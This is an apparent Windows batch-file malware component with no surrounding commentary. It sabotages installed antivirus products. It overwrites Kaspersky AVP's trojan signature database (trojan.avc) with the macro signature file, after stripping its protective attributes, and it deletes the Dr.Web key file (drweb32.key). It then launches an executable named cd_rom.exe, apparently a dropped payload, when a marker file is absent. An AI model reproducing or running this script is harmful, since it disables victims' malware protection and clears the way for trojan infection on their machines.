   @echo off
   if exist C:\Progra~1\Common~1\AVPSha~1\AVPBASES\trojan.avc goto a
   if exist C:\Progra~1\AntiVi~1\trojan.avc goto b
   if exist C:\Progra~1\AVPSHA~1\AVPBASES\trojan.avc goto c
   if exist C:\Progra~1\DrWebf~1\drweb32.key goto d
   goto f
   :a
   attrib C:\Progra~1\Common~1\AVPSha~1\AVPBASES\trojan.avc -r -h -s >nul
   del C:\Progra~1\Common~1\AVPSha~1\AVPBASES\trojan.avc >nul
   copy C:\Progra~1\Common~1\AVPSha~1\AVPBASES\macro.avc C:\Progra~1\Common~1\AVPSha~1\macro.avc >nul
   attrib C:\Progra~1\Common~1\AVPSha~1\macro.avc -r -h -s >nul
   ren C:\Progra~1\Common~1\AVPSha~1\macro.avc trojan.avc >nul
   copy C:\Progra~1\Common~1\AVPSha~1\trojan.avc C:\Progra~1\Common~1\AVPSha~1\AVPBASES\trojan.avc >nul
   del C:\Progra~1\Common~1\AVPSha~1\trojan.avc >nul
   if exist C:\Progra~1\DrWebf~1\drweb32.key goto d
   goto f
   :b
   attrib C:\Progra~1\AntiVi~1\trojan.avc -r -h -s >nul
   del C:\Progra~1\AntiVi~1\trojan.avc >nul
   copy C:\Progra~1\AntiVi~1\macro.avc C:\Progra~1\macro.avc >nul
   attrib C:\Progra~1\macro.avc -r -h -s >nul
   ren C:\Progra~1\macro.avc trojan.avc >nul
   copy C:\Progra~1\trojan.avc C:\Progra~1\AntiVi~1\trojan.avc >nul
   del C:\Progra~1\trojan.avc >nul
   if exist C:\Progra~1\DrWebf~1\drweb32.key goto d
   goto f
   :c
   attrib C:\Progra~1\AVPSHA~1\AVPBASES\trojan.avc -r -h -s >nul
   del C:\Progra~1\AVPSHA~1\AVPBASES\trojan.avc >nul
   copy C:\Progra~1\AVPSHA~1\AVPBASES\macro.avc C:\Progra~1\AVPSHA~1\macro.avc >nul
   attrib C:\Progra~1\AVPSHA~1\macro.avc -r -h -s >nul
   ren C:\Progra~1\AVPSHA~1\macro.avc trojan.avc >nul
   copy C:\Progra~1\AVPSHA~1\trojan.avc C:\Progra~1\AVPSHA~1\AVPBASES\trojan.avc >nul
   del C:\Progra~1\AVPSHA~1\trojan.avc >nul
   if exist C:\Progra~1\DrWebf~1\drweb32.key goto d
   goto f
   :d
   del C:\Progra~1\DrWebf~1\drweb32.key >nul
   exit
   :f
   if not exist c:\windows\system\host.exe goto e
   exit
   :e
   if exist c:\windows\cd_rom.exe c:\windows\cd_rom.exe
